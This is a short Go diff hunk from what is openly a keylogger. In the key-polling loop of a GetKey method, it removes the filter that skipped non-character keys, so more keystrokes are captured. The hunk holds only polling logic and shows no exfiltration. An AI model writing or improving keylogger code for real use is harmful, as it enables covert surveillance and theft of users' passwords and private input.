@@ -51,7 +51,7 @@ func (kl *Keylogger) GetKey() Key {
 
 		// Check if the most significant bit is set (key is down)
 		// And check if the key is not a non-char key (except for space, 0x20)
-		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
+		if keyState&(1<<15) != 0 && (i < 160 || i > 165) && (i < 91 || i > 93) {
 			activeKey = i
 			break
 		}
